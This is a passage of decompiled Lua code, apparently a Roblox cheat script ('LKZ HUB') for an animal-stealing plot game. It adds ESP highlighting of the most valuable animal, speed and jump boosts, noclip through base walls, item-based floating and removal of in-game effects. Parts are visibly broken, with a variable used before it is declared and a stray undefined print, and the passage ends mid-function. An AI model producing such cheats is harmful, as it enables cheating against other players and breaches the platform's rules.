    v382_("Go to Best", v_u_257_, "None")
    v370_("Server Keybinds", "", v_u_257_)
    v382_("Low Graphic", v_u_257_, "None")
    v370_("Manage Config", "", v_u_257_)
    local v_u_731_ = false
    local _, _, _ = v347_("DELETE ALL CONFIGS", v_u_257_, function()
		-- upvalues: (ref) v_u_731_, (ref) v_u_227_, (ref) v_u_250_, (ref) v_u_229_
        if v_u_731_ then
            v_u_227_:ClearConfig()
            v_u_250_("Success", "Configs deleted. Please re-execute.", 5)
            deleteConfigLabel.Text = "DELETE ALL CONFIGS"
            deleteConfigRef.BackgroundColor3 = v_u_229_.PRIMARY
            v_u_731_ = false
        else
            v_u_731_ = true
            deleteConfigLabel.Text = "CLICK AGAIN TO CONFIRM"
            deleteConfigRef.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            task.delay(3, function()
				-- upvalues: (ref) v_u_731_, (ref) v_u_229_
                if v_u_731_ then
                    v_u_731_ = false
                    deleteConfigLabel.Text = "DELETE ALL CONFIGS"
                    deleteConfigRef.BackgroundColor3 = v_u_229_.PRIMARY
                end
            end)
        end
    end)
    if _G.LKZ_ESPCOLOR_EVENT == nil then
        if game.CoreGui:FindFirstChild("LKZ_HUB_Modern") then
            local v732_ = game.CoreGui:FindFirstChild("LKZ_HUB_Modern")
            local v733_ = Instance.new("BindableEvent")
            v733_.Name = "LKZ_ESPCOLOR_EVENT"
            v733_.Parent = v732_
            _G.LKZ_ESPCOLOR_EVENT = v733_
        else
            local v734_ = Instance.new("BindableEvent")
            v734_.Name = "LKZ_ESPCOLOR_EVENT"
            v734_.Parent = game:GetService("CoreGui")
            _G.LKZ_ESPCOLOR_EVENT = v734_
        end
    end
    if _G.LKZ_ESPCOLOR_EVENT then
        _G.LKZ_ESPCOLOR_EVENT.Event:Connect(function(_)
            local v735_, v736_, v737_ = pairs(workspace:GetDescendants())
            repeat
                local v738_
                v737_, v738_ = v735_(v736_, v737_)
            until v737_ == nil
        end)
    end
    task.spawn(function()
		-- upvalues: (ref) v_u_640_
        local v739_ = nil
        while true do
            if not task.wait(0.3) then
                return
            end
            local v740_ = "-"
            local v741_ = 0
            local v742_ = workspace:FindFirstChild("Plots")
            if v742_ then
                local v743_, v744_, v745_ = ipairs(v742_:GetChildren())
                while true do
                    local v746_
                    v745_, v746_ = v743_(v744_, v745_)
                    if v745_ == nil then
                        break
                    end
                    local v747_, v748_, v749_ = ipairs(v746_:GetDescendants())
                    local v750_ = false
                    while true do
                        local v751_
                        v749_, v751_ = v747_(v748_, v749_)
                        if v749_ == nil then
                            break
                        end
                        if v751_:IsA("TextLabel") and type(v751_.Text) == "string" and v751_.Text:find(v_u_640_.DisplayName) then
                            v750_ = true
                            break
                        end
                    end
                    if not v750_ then
                        local v752_ = v746_:FindFirstChild("AnimalPodiums")
                        if v752_ then
                            local v753_, v754_, v755_ = ipairs(v752_:GetChildren())
                            while true do
                                local v756_
                                v755_, v756_ = v753_(v754_, v755_)
                                if v755_ == nil then
                                    break
                                end
                                local v757_ = v756_:FindFirstChild("Base") and (v756_.Base:FindFirstChild("Spawn") and v756_.Base.Spawn:FindFirstChild("Attachment"))
                                if v757_ then
                                    v757_ = v756_.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
                                end
                                if v757_ then
                                    local v758_, v759_, v760_ = ipairs(v757_:GetDescendants())
                                    local v761_ = nil
                                    local v762_ = nil
                                    while true do
                                        local v763_
                                        v760_, v763_ = v758_(v759_, v760_)
                                        if v760_ == nil then
                                            break
                                        end
                                        if v763_:IsA("TextLabel") then
                                            if v763_.Name == "Generation" then
                                                v761_ = v763_
                                            end
                                            if v763_.Name == "Stolen" then
                                                v762_ = v763_
                                            end
                                        end
                                    end
                                    if v761_ and (v762_ and (v762_.Text == "STOLEN" or v762_.Text == "IN FUSE")) and v761_.Text and v761_.Text:find("/s") then
                                        local v764_, v765_ = v761_.Text:gsub(",", ""):match("([%d%.]+)([kKmMbB]?)")
                                        local v766_ = tonumber(v764_) or 0
                                        if v765_ then
                                            local v767_ = v765_:lower()
                                            if v767_ == "k" then
                                                v766_ = v766_ * 1000
                                            elseif v767_ == "m" then
                                                v766_ = v766_ * 1000000
                                            elseif v767_ == "b" then
                                                v766_ = v766_ * 1000000000
                                            end
                                        end
                                        if v741_ < v766_ then
                                            v740_ = v761_.Text
                                            v741_ = v766_
                                        end
                                    end
                                end
                            end
                        end
                        local v768_, v769_, v770_ = ipairs(v746_:GetChildren())
                        while true do
                            local v771_
                            v770_, v771_ = v768_(v769_, v770_)
                            if v770_ == nil then
                                break
                            end
                            if v771_:IsA("Model") then
                                local v772_, v773_, v774_ = ipairs(v771_:GetDescendants())
                                while true do
                                    local v775_
                                    v774_, v775_ = v772_(v773_, v774_)
                                    if v774_ == nil then
                                        break
                                    end
                                    if v775_.Name == "AnimalOverhead" then
                                        local v776_, v777_, v778_ = ipairs(v775_:GetDescendants())
                                        local v779_ = nil
                                        local v780_ = nil
                                        while true do
                                            local v781_
                                            v778_, v781_ = v776_(v777_, v778_)
                                            if v778_ == nil then
                                                break
                                            end
                                            if v781_:IsA("TextLabel") then
                                                if v781_.Name == "Generation" then
                                                    v779_ = v781_
                                                end
                                                if v781_.Name == "Stolen" then
                                                    v780_ = v781_
                                                end
                                            end
                                        end
                                        if v779_ and (v780_ and (v780_.Text == "STOLEN" or v780_.Text == "IN FUSE")) and v779_.Text and v779_.Text:find("/s") then
                                            local v782_, v783_ = v779_.Text:gsub(",", ""):match("([%d%.]+)([kKmMbB]?)")
                                            local v784_ = tonumber(v782_) or 0
                                            if v783_ then
                                                local v785_ = v783_:lower()
                                                if v785_ == "k" then
                                                    v784_ = v784_ * 1000
                                                elseif v785_ == "m" then
                                                    v784_ = v784_ * 1000000
                                                elseif v785_ == "b" then
                                                    v784_ = v784_ * 1000000000
                                                end
                                            end
                                            if v741_ < v784_ then
                                                v740_ = v779_.Text
                                                v741_ = v784_
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            local v786_ = game.CoreGui:FindFirstChild("LKZ_HUB_Modern")
            if v786_ and v786_:FindFirstChild("MainContainer") and v786_.MainContainer:FindFirstChild("Header") then
                local v787_ = v786_.MainContainer.Header:FindFirstChild("BestLabel")
                if v787_ and v787_:IsA("TextLabel") then
                    local v788_ = v741_ <= 0 and "Best: -" or "Best: " .. v740_
                    if v788_ ~= v739_ then
                        v787_.Text = v788_
                        v739_ = v788_
                    end
                end
            end
        end
    end)
    local function v826_()
        local v789_ = game:GetService("Players")
        local v_u_790_ = game:GetService("Lighting")
        local v_u_791_ = game:GetService("RunService")
        local v_u_792_ = game:GetService("ReplicatedStorage")
        local v793_ = v789_.LocalPlayer
        local v_u_794_ = workspace.CurrentCamera
        local v_u_795_ = v793_.Character or v793_.CharacterAdded:Wait()
        local v796_ = v_u_795_
        local v_u_797_ = v_u_795_.WaitForChild(v796_, "Humanoid")
        local v_u_798_ = "rbxassetid://109061983885712"
        local v_u_799_ = false
        local function v_u_802_()
			-- upvalues: (ref) v_u_799_, (ref) v_u_791_, (ref) v_u_797_
            if not v_u_799_ then
                v_u_799_ = true
                local v_u_800_ = tick()
                local v_u_801_ = nil
                v_u_801_ = v_u_791_.RenderStepped:Connect(function()
					-- upvalues: (ref) v_u_800_, (ref) v_u_801_, (ref) v_u_799_, (ref) v_u_797_
                    if tick() - v_u_800_ <= 5 then
                        pcall(function()
							-- upvalues: (ref) v_u_797_
                            if v_u_797_ then
                                v_u_797_:Move(Vector3.new(- v_u_797_.MoveDirection.X, v_u_797_.MoveDirection.Y, - v_u_797_.MoveDirection.Z), false)
                            end
                        end)
                    else
                        v_u_801_:Disconnect()
                        v_u_799_ = false
                    end
                end)
            end
        end
        local function v_u_808_()
			-- upvalues: (ref) v_u_795_
            task.spawn(function()
				-- upvalues: (ref) v_u_795_
                local v803_ = v_u_795_
                local v804_, v805_, v806_ = ipairs(v803_:GetDescendants())
                while true do
                    local v807_
                    v806_, v807_ = v804_(v805_, v806_)
                    if v806_ == nil then
                        break
                    end
                    if v807_:IsA("ParticleEmitter") then
                        v807_:Destroy()
                    end
                end
            end)
        end
        local function v_u_813_()
			-- upvalues: (ref) v_u_792_
            task.spawn(function()
				-- upvalues: (ref) v_u_792_
                local v809_ = v_u_792_:FindFirstChild("Controllers")
                local v810_ = v809_ and v809_:FindFirstChild("ItemController")
                if v810_ then
                    local v811_ = v810_:FindFirstChild("BeeLauncherController")
                    local v812_ = v811_ and v811_:FindFirstChild("Buzzing")
                    if v812_ then
                        v812_:Destroy()
                    end
                end
            end)
        end
        local function v_u_817_()
			-- upvalues: (ref) v_u_790_, (ref) v_u_792_
            task.spawn(function()
				-- upvalues: (ref) v_u_790_, (ref) v_u_792_
                if v_u_790_:FindFirstChild("Blur") then
                    v_u_790_.Blur:Destroy()
                end
                if v_u_790_:FindFirstChild("DiscoEffect") then
                    v_u_790_.DiscoEffect:Destroy()
                end
                local v814_ = v_u_792_:FindFirstChild("Controllers")
                local v815_ = v814_ and v814_:FindFirstChild("ItemController")
                if v815_ then
                    local v816_ = v815_:FindFirstChild("BoogieBombController")
                    if v816_ and v816_:FindFirstChild("BOOM") then
                        v816_.BOOM:Destroy()
                    end
                end
            end)
        end
        local function v_u_820_(p818_)
			-- upvalues: (ref) v_u_798_
            p818_.AnimationPlayed:Connect(function(p819_)
				-- upvalues: (ref) v_u_798_
                if p819_.Animation and p819_.Animation.AnimationId == v_u_798_ then
                    p819_:Stop()
                end
            end)
        end
        local v821_ = v_u_797_
        local v822_ = v_u_797_.FindFirstChildOfClass(v821_, "Animator")
        if v822_ then
            v_u_820_(v822_)
        else
            v_u_797_.ChildAdded:Connect(function(p823_)
				-- upvalues: (ref) v_u_820_
                if p823_:IsA("Animator") then
                    v_u_820_(p823_)
                end
            end)
        end
        v_u_790_.ChildAdded:Connect(function(p824_)
			-- upvalues: (ref) v_u_802_, (ref) v_u_808_, (ref) v_u_813_, (ref) v_u_817_
            local v825_ = p824_.Name:lower()
            if v825_ == "beeblur" then
                p824_:Destroy()
                v_u_802_()
                v_u_808_()
                v_u_813_()
            elseif v825_ == "colorcorrection" then
                p824_:Destroy()
            else
                v_u_817_()
            end
        end)
        task.spawn(function()
			-- upvalues: (ref) v_u_791_, (ref) v_u_794_
            v_u_791_.RenderStepped:Connect(function()
				-- upvalues: (ref) v_u_794_
                if v_u_794_ and v_u_794_.FieldOfView ~= 70 then
                    v_u_794_.FieldOfView = 70
                end
            end)
        end)
        v_u_794_:GetPropertyChangedSignal("FieldOfView"):Connect(function()
			-- upvalues: (ref) v_u_794_
            if v_u_794_.FieldOfView ~= 70 then
                v_u_794_.FieldOfView = 70
            end
        end)
        v_u_794_.FieldOfView = 70
    end
    if not _G.BypassLighting then
        task.spawn(v826_)
    end
    _G.BypassLighting = true
    v_u_250_("Auto Bypass Bee + Boogie + Anti Fps Devorer", "Activated", 3)
    if v_u_4_ == "Unknown" then
        v_u_250_("UI Loaded", "LKZ HUB initialized", 3)
    else
        v_u_250_("UI LOADED", "welcome " .. v_u_4_ .. "!!", 3)
    end
    return {
        ["CreateTab"] = v314_,
        ["CreateToggle"] = v337_,
        ["CreateButton"] = v347_,
        ["CreateParagraph"] = v370_,
        ["CreateColorPicker"] = v404_,
        ["CreateInput"] = v416_,
        ["CreateSlider"] = v458_,
        ["ShowNotification"] = v_u_250_,
        ["SaveManager"] = v_u_227_
    }
end
task.spawn(function()
	-- upvalues: (ref) v_u_11_
    if game.CoreGui:FindFirstChild("LKZ_Hub") then
        game.CoreGui.LKZ_Hub:Destroy()
    end
    local v827_ = game:GetService("Players").LocalPlayer
    local v828_ = game:GetService("RunService")
    local v829_ = v_u_11_
    local v_u_830_ = true
    local v_u_831_ = nil
    local v_u_832_ = nil
    local v_u_833_ = false
    local function v_u_835_(p834_)
		-- upvalues: (ref) v_u_831_, (ref) v_u_832_
        if p834_ then
            p834_:WaitForChild("Humanoid")
            p834_:WaitForChild("HumanoidRootPart")
            v_u_831_ = p834_.Humanoid
            v_u_832_ = p834_.HumanoidRootPart
        else
            v_u_831_ = nil
            v_u_832_ = nil
        end
    end
    if v827_.Character then
        v_u_835_(v827_.Character)
    end
    v827_.CharacterAdded:Connect(function(p836_)
		-- upvalues: (ref) v_u_835_, (ref) v_u_833_
        v_u_835_(p836_)
        v_u_833_ = false
    end)
    v829_.JumpRequest:Connect(function()
		-- upvalues: (ref) v_u_830_, (ref) v_u_832_
        if _G.superJump and (v_u_830_ and v_u_832_) then
            v_u_830_ = false
            local v837_ = v_u_832_.AssemblyLinearVelocity
            v_u_832_.AssemblyLinearVelocity = Vector3.new(v837_.X, 80, v837_.Z)
            task.delay(1.5, function()
				-- upvalues: (ref) v_u_830_
                v_u_830_ = true
            end)
        end
    end)
    v828_.RenderStepped:Connect(function()
		-- upvalues: (ref) v_u_831_, (ref) v_u_832_, (ref) v_u_833_
        if v_u_831_ and v_u_832_ then
            if _G.additionalSpeed then
                local v838_ = v_u_831_.MoveDirection
                local v839_ = v_u_832_.AssemblyLinearVelocity
                v_u_832_.AssemblyLinearVelocity = Vector3.new(v838_.X * 27, v839_.Y, v838_.Z * 27)
            end
            if _G.upstairs then
                if not v_u_833_ then
                    v_u_833_ = true
                    task.spawn(function()
						-- upvalues: (ref) v_u_832_
                        if v_u_832_ then
                            v_u_832_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        end
                    end)
                end
                local v840_ = v_u_832_.Position.Y
                local v841_ = nil
                if - 4 <= v840_ and v840_ <= 11 then
                    v841_ = 7
                elseif 12 <= v840_ and v840_ <= 28 then
                    v841_ = 24
                elseif v840_ > 28 then
                    v_u_832_.AssemblyLinearVelocity = Vector3.zero
                    v_u_831_.JumpPower = 0
                    return
                end
                local v842_ = v841_ - v840_
                local v843_ = math.clamp(v842_ * 5, 0, 90)
                local v844_ = v_u_831_.MoveDirection
                v_u_832_.AssemblyLinearVelocity = Vector3.new(v844_.X * 15, v843_, v844_.Z * 15)
                v_u_831_.JumpPower = 0
            else
                if v_u_833_ then
                    v_u_833_ = false
                end
                if v_u_831_ and v_u_831_.JumpPower ~= 50 then
                    v_u_831_.JumpPower = 50
                end
            end
        end
    end)
end)
local v_u_845_ = game:GetService("Players").LocalPlayer
local v_u_846_ = v_u_845_.Character or v_u_845_.CharacterAdded:Wait()
local v847_ = v_u_846_
local v_u_848_ = v_u_846_.WaitForChild(v847_, "Humanoid")
local v_u_849_ = v_u_845_:WaitForChild("Backpack")
local v850_ = v_u_846_
local v_u_851_ = v_u_846_.WaitForChild(v850_, "HumanoidRootPart")
task.spawn(function()
	-- upvalues: (ref) v_u_845_, (ref) v_u_846_, (ref) v_u_848_, (ref) v_u_851_, (ref) v_u_849_
    while task.wait(0.1) do
        if v_u_845_.Character then
            v_u_846_ = v_u_845_.Character
            v_u_848_ = v_u_846_:WaitForChild("Humanoid")
            v_u_851_ = v_u_846_:WaitForChild("HumanoidRootPart")
            v_u_849_ = v_u_845_:WaitForChild("Backpack")
        else
            v_u_845_.CharacterAdded:Wait()
        end
    end
end)
local v_u_852_ = v10_:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/UseItem")
local v_u_853_ = Vector3.new(0.6399999260902405, 0.7299998998641968, 0.4700000882148742)
local v_u_854_ = 0.09
local function v_u_858_(p855_, p856_, p857_)
    return math.abs(p855_.X - p856_.X) <= p857_ and (math.abs(p855_.Y - p856_.Y) <= p857_ and math.abs(p855_.Z - p856_.Z) <= p857_)
end
local function v_u_863_()
	-- upvalues: (ref) v_u_858_, (ref) v_u_853_, (ref) v_u_854_
    local v859_, v860_, v861_ = ipairs(workspace:GetChildren())
    while true do
        local v862_
        v861_, v862_ = v859_(v860_, v861_)
        if v861_ == nil then
            break
        end
        if v862_:IsA("BasePart") and (v862_.Name == "Handle" and v_u_858_(v862_.Size, v_u_853_, v_u_854_)) then
            return v862_
        end
    end
    return nil
end
local function v_u_874_()
	-- upvalues: (ref) v_u_846_, (ref) v_u_849_, (ref) v_u_848_
    local v864_ = v_u_846_
    local v865_, v866_, v867_ = ipairs(v864_:GetChildren())
    while true do
        local v868_
        v867_, v868_ = v865_(v866_, v867_)
        if v867_ == nil then
            break
        end
        if v868_:IsA("Tool") and v868_.Name ~= "Boogie Bomb" then
            v868_.Parent = v_u_849_
        end
    end
    local v869_ = v_u_849_
    local v870_, v871_, v872_ = ipairs(v869_:GetChildren())
    while true do
        local v873_
        v872_, v873_ = v870_(v871_, v872_)
        if v872_ == nil then
            break
        end
        if v873_:IsA("Tool") and v873_.Name == "Boogie Bomb" then
            v_u_848_:EquipTool(v873_)
            return v873_
        end
    end
end
task.spawn(function()
	-- upvalues: (ref) v_u_863_, (ref) v_u_851_, (ref) v_u_852_, (ref) v_u_874_
    while task.wait() do
        if _G.FloatV2 then
            local v875_ = v_u_863_()
            if v875_ then
                v875_.CanCollide = true
                v875_.Anchored = true
                v875_.CFrame = CFrame.new(v_u_851_.Position.X, v_u_851_.Position.Y - 4.35, v_u_851_.Position.Z)
            else
                v_u_852_:FireServer()
                v_u_874_()
                v_u_852_:FireServer()
            end
        else
            task.wait(0.1)
        end
    end
end)
local v_u_876_ = game:GetService("Players").LocalPlayer
local v_u_877_ = nil
local v_u_878_ = {}
local v_u_879_ = nil
local v_u_880_ = nil
local function v_u_885_()
	-- upvalues: (ref) v_u_877_, (ref) v_u_878_, (ref) v_u_879_, (ref) v_u_880_
    if v_u_877_ then
        pcall(function()
			-- upvalues: (ref) v_u_877_
            v_u_877_:Destroy()
        end)
        v_u_877_ = nil
    end
    local v881_, v882_, v883_ = pairs(v_u_878_)
    while true do
        local v_u_884_
        v883_, v_u_884_ = v881_(v882_, v883_)
        if v883_ == nil then
            break
        end
        pcall(function()
			-- upvalues: (ref) v_u_884_
            v_u_884_:Destroy()
        end)
    end
    v_u_878_ = {}
    v_u_879_ = nil
    v_u_880_ = nil
end
task.spawn(function()
	-- upvalues: (ref) v_u_876_, (ref) v_u_879_, (ref) v_u_885_, (ref) v_u_877_, (ref) v_u_880_, (ref) v_u_878_
	
    while true do
        if not task.wait(0.3) then
            return
        end
        if _G.bestESP then
            break
        end
        if v_u_879_ then
            v_u_885_()
        end
    end
    local v886_, v887_, v888_ = ipairs(workspace:FindFirstChild("Plots") and (workspace.Plots:GetChildren() or {}) or {})
    local v889_ = 0
    local v890_ = nil
    local v891_ = "-"
    local v892_ = v933_:FindFirstChild("PlotSign")
    local v893_ = false
    if v892_ then
        local v894_, v895_, v896_ = ipairs(v892_:GetDescendants())
        while true do
            local v897_
            v896_, v897_ = v894_(v895_, v896_)
            if v896_ == nil then
                break
            end
            if v897_:IsA("TextLabel") and type(v897_.Text) == "string" and v897_.Text:find(v_u_876_.DisplayName) then
                v893_ = true
                break
            end
        end
    end
    if not v893_ then
        local v898_ = v933_:FindFirstChild("AnimalPodiums")
        if v898_ then
            local v899_, v900_, v901_ = ipairs(v898_:GetChildren())
            while true do
                local v902_
                v901_, v902_ = v899_(v900_, v901_)
                if v901_ == nil then
                    break
                end
                local v903_ = v902_:FindFirstChild("Base") and (v902_.Base:FindFirstChild("Spawn") and v902_.Base.Spawn:FindFirstChild("Attachment"))
                if v903_ then
                    v903_ = v902_.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
                end
                if v903_ then
                    local v904_, v905_, v906_ = ipairs(v903_:GetDescendants())
                    local v907_ = nil
                    local v908_ = nil
                    while true do
                        local v909_, v910_ = v904_(v905_, v906_)
                        if v909_ == nil then
                            break
                        end
                        v906_ = v909_
                        if v910_:IsA("TextLabel") then
                            if v910_.Name == "Generation" then
                                v907_ = v910_
                            end
                            if v910_.Name == "Stolen" then
                                v908_ = v910_
                            end
                        end
                    end
                    if v907_ and (v908_ and (v908_.Text == "STOLEN" or v908_.Text == "IN FUSE")) and v907_.Text and v907_.Text:find("/s") then
                        local v911_, v912_ = v907_.Text:gsub(",", ""):match("([%d%.]+)([kKmMbB]?)")
                        local v913_ = tonumber(v911_) or 0
                        if v912_ then
                            local v914_ = v912_:lower()
                            if v914_ == "k" then
                                v913_ = v913_ * 1000
                            elseif v914_ == "m" then
                                v913_ = v913_ * 1000000
                            elseif v914_ == "b" then
                                v913_ = v913_ * 1000000000
                            end
                        end
                        if v889_ < v913_ then
                            v891_ = v907_.Text
                            v890_ = v907_
                            v889_ = v913_
                        end
                    end
                end
            end
        end
        local v915_, v916_, v917_ = ipairs(v933_:GetChildren())
        while true do
            local v918_
            v917_, v918_ = v915_(v916_, v917_)
            if v917_ == nil then
                break
            end
            if v918_:IsA("Model") then
                local v919_, v920_, v921_ = ipairs(v918_:GetDescendants())
                while true do
                    local v922_
                    v921_, v922_ = v919_(v920_, v921_)
                    if v921_ == nil then
                        break
                    end
                    if v922_.Name == "AnimalOverhead" then
                        local v923_, v924_, v925_ = ipairs(v922_:GetDescendants())
                        local v926_ = nil
                        local v927_ = nil
                        while true do
                            local v928_
                            v925_, v928_ = v923_(v924_, v925_)
                            if v925_ == nil then
                                break
                            end
                            if v928_:IsA("TextLabel") then
                                if v928_.Name == "Generation" then
                                    v926_ = v928_
                                end
                                if v928_.Name == "Stolen" then
                                    v927_ = v928_
                                end
                            end
                        end
                        if v926_ and (v927_ and (v927_.Text == "STOLEN" or v927_.Text == "IN FUSE")) and v926_.Text and v926_.Text:find("/s") then
                            local v929_, v930_ = v926_.Text:gsub(",", ""):match("([%d%.]+)([kKmMbB]?)")
                            local v931_ = tonumber(v929_) or 0
                            if v930_ then
                                local v932_ = v930_:lower()
                                if v932_ == "k" then
                                    v931_ = v931_ * 1000
                                elseif v932_ == "m" then
                                    v931_ = v931_ * 1000000
                                elseif v932_ == "b" then
                                    v931_ = v931_ * 1000000000
                                end
                            end
                            if v889_ < v931_ then
                                v891_ = v926_.Text
                                v890_ = v926_
                                v889_ = v931_
                            end
                        end
                    end
                end
            end
        end
    end
    local v933_
    v888_, v933_ = v886_(v887_, v888_)
    if v888_ ~= nil then
        print(l132)
    else
        print(l132)
    end
    if v890_ then
        if v890_ ~= v_u_879_ then
            v_u_885_()
            v_u_879_ = v890_
            v_u_880_ = v891_
            local v934_ = v890_.Parent
            while v934_ and not v934_:IsA("Model") do
                v934_ = v934_.Parent
            end
            local v935_ = nil
            local v936_ = nil
            local v937_ = nil
            local v938_ = nil
            local v939_ = nil
            local v940_ = nil
            if v934_ then
                local v941_, v942_, v943_ = ipairs(v934_:GetDescendants())
                while true do
                    local v944_
                    v943_, v944_ = v941_(v942_, v943_)
                    if v943_ == nil then
                        break
                    end
                    if not v935_ then
                        if v944_:IsA("Attachment") then
                            v935_ = v944_
                        end
                    end
                    if not v936_ and v944_.Name == "Generation" then
                        if v944_:IsA("TextLabel") then
                            v936_ = v944_
                        end
                    end
                    if not v937_ and v944_.Name == "Rarity" then
                        if v944_:IsA("TextLabel") then
                            v937_ = v944_
                        end
                    end
                    if not v938_ and v944_.Name == "DisplayName" then
                        if v944_:IsA("TextLabel") then
                            v938_ = v944_
                        end
                    end
                    if not v939_ and v944_.Name == "Mutation" then
                        if v944_:IsA("TextLabel") then
                            v939_ = v944_
                        end
                    end
                    if not v940_ and v944_:IsA("BasePart") then
                        if v944_.Name == "Base" then
                            v940_ = v944_
                        end
                    end
                end
            end
            local v945_ = nil
            if v935_ and v935_.Parent and v935_.Parent:IsA("BasePart") then
                v945_ = v935_.Parent
            elseif v940_ and v940_.Parent then
                v945_ = v940_
            elseif v934_ then
                v945_ = v934_:FindFirstChildWhichIsA("BasePart", true)
            end
            if v945_ then
                local v946_ = Instance.new("BillboardGui")
                v946_.Name = "BestAnimalESP"
                v946_.AlwaysOnTop = true
                v946_.Size = UDim2.new(0, 120, 0, 45)
                v946_.StudsOffset = Vector3.new(0, 3.375, 0)
                v946_.Adornee = v945_
                v946_.ZIndexBehavior = Enum.ZIndexBehavior.Global
                v946_.Parent = v945_
                local v947_ = Instance.new("Frame")
                v947_.BackgroundTransparency = 0.08
                v947_.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
                v947_.BorderSizePixel = 0
                v947_.Size = UDim2.new(1, 0, 1, 0)
                v947_.ZIndex = 100
                v947_.Parent = v946_
                local v948_ = Instance.new("UICorner")
                v948_.CornerRadius = UDim.new(0, 6)
                v948_.Parent = v947_
                local v949_ = Instance.new("UIStroke")
                v949_.Color = Color3.fromRGB(0, 150, 255)
                v949_.Thickness = 1.2
                v949_.Transparency = 0.3
                v949_.Parent = v947_
                local v950_ = Instance.new("UIGradient")
                v950_.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 150, 255)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 100, 255))
                })
                v950_.Rotation = 45
                v950_.Parent = v949_
                local v951_ = not (v939_ and v939_.Visible) and "Normal" or v939_.ContentText
                local v952_ = Instance.new("TextLabel")
                v952_.Size = UDim2.new(1, - 8, 1, - 4)
                v952_.Position = UDim2.new(0, 4, 0, 2)
                v952_.BackgroundTransparency = 1
                v952_.TextColor3 = Color3.fromRGB(255, 255, 255)
                v952_.TextScaled = true
                v952_.Font = Enum.Font.GothamBold
                v952_.TextStrokeTransparency = 0.6
                v952_.TextWrapped = true
                v952_.TextXAlignment = Enum.TextXAlignment.Left
                v952_.TextYAlignment = Enum.TextYAlignment.Top
                v952_.TextSize = v952_.TextSize * 1.05
                v952_.Text = string.format("%s\n%s\n%s\n%s", v938_ and v938_.Text or "Unknown", v937_ and v937_.Text or "-", v951_, v936_ and v936_.Text or "-")
                v952_.ZIndex = 101
                v952_.Parent = v947_
                v_u_877_ = v946_
                if v934_ then
                    local v953_, v954_, v955_ = ipairs(v940_ and v940_:GetDescendants() or (v934_ and v934_:GetDescendants() or {}))
                    while true do
                        local v_u_956_
                        v955_, v_u_956_ = v953_(v954_, v955_)
                        if v955_ == nil then
                            break
                        end
                        if v_u_956_:IsA("BasePart") then
                            local v_u_957_ = Instance.new("Highlight")
                            v_u_957_.Name = "ESP_Deco"
                            v_u_957_.FillColor = Color3.fromRGB(0, 150, 255)
                            v_u_957_.OutlineColor = Color3.fromRGB(0, 100, 255)
                            v_u_957_.FillTransparency = 0.3
                            v_u_957_.OutlineTransparency = 0.2
                            v_u_957_.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                            pcall(function()
								-- upvalues: (ref) v_u_957_, (ref) v_u_956_
                                v_u_957_.Parent = v_u_956_
                            end)
                            v_u_878_[v_u_956_] = v_u_957_
                        end
                    end
                end
            end
        elseif v_u_877_ and v_u_880_ ~= v891_ then
            v_u_880_ = v891_
        end
    elseif v_u_879_ then
        v_u_885_()
    end
end)
task.spawn(function()
	-- upvalues: (ref) v_u_199_, (ref) v_u_198_, (ref) v_u_200_
    local v958_ = workspace:WaitForChild("Plots")
    local v959_ = game:GetService("Players").LocalPlayer
    while task.wait(0.05) do
        if _G.upstairs then
            local v960_ = v959_.Character
            if v960_ then
                v960_ = v960_:FindFirstChild("HumanoidRootPart")
            end
            if v960_ then
                local v961_ = v960_.Position.Y
                local v962_, v963_, v964_ = ipairs(v958_:GetChildren())
                while true do
                    local v965_
                    v964_, v965_ = v962_(v963_, v964_)
                    if v964_ == nil then
                        break
                    end
                    local v966_ = v965_:FindFirstChild("Decorations")
                    if v966_ then
                        local v967_ = v966_:GetChildren()
                        local v968_, v969_, v970_ = ipairs({
                            27,
                            31,
                            32,
                            33,
                            34,
                            35
                        })
                        while true do
                            local v971_
                            v970_, v971_ = v968_(v969_, v970_)
                            if v970_ == nil then
                                break
                            end
                            local v972_ = v967_[v971_]
                            if v972_ and (v972_:IsA("BasePart") and v961_ < v972_.Position.Y) then
                                if not v_u_199_[v972_] then
                                    v_u_199_[v972_] = v972_.CanCollide
                                    v_u_198_[v972_] = v972_.Transparency
                                end
                                v972_.CanCollide = false
                                v972_.Transparency = 0.85
                            end
                        end
                    end
                    local v973_, v974_, v975_ = ipairs(v965_:GetDescendants())
                    while true do
                        local v976_
                        v975_, v976_ = v973_(v974_, v975_)
                        if v975_ == nil then
                            break
                        end
                        if v976_:IsA("BasePart") and v961_ < v976_.Position.Y then
                            local v977_ = v976_.Color
                            if math.floor(v977_.R * 255) == 52 and (math.floor(v977_.G * 255) == 142 and math.floor(v977_.B * 255) == 64) then
                                if not v_u_200_[v976_] then
                                    v_u_200_[v976_] = {
                                        ["CanCollide"] = v976_.CanCollide,
                                        ["Transparency"] = v976_.Transparency
                                    }
                                end
                                v976_.CanCollide = false
                                v976_.Transparency = 1
                            end
                            if (v976_.Size == Vector3.new(6, 0.25, 6) or v976_.Size == Vector3.new(4, 0.25, 4)) and not v_u_199_[v976_] then
                                v_u_199_[v976_] = v976_.CanCollide
                                v_u_198_[v976_] = v976_.Transparency
                                v976_.CanCollide = false
                                v976_.Transparency = 0.85
                            end
                        end
                    end
                end
            end
        else
            local v978_, v979_, v980_ = pairs(v_u_200_)
            while true do
                local v981_
                v980_, v981_ = v978_(v979_, v980_)
                if v980_ == nil then
                    break
                end
                if v980_ and v980_.Parent then
                    v980_.CanCollide = v981_.CanCollide
                    v980_.Transparency = v981_.Transparency
                end
            end
            local v982_, v983_, v984_ = pairs(v_u_199_)
            while true do
                local v985_
                v984_, v985_ = v982_(v983_, v984_)
                if v984_ == nil then
                    break
                end
                if v984_ and v984_.Parent then
                    v984_.CanCollide = v985_
                    v984_.Transparency = v_u_198_[v984_] or v984_.Transparency
                end
            end
            v_u_199_ = {}
            v_u_198_ = {}
            v_u_200_ = {}
        end
    end
end)
game:GetService("RunService").Heartbeat:Connect(function()
    local v986_ = game:GetService("Players")
    game:GetService("RunService")
    local v987_ = v986_.LocalPlayer
    local v988_ = (v987_.Character or v987_.CharacterAdded:Wait()):FindFirstChild("HumanoidRootPart")
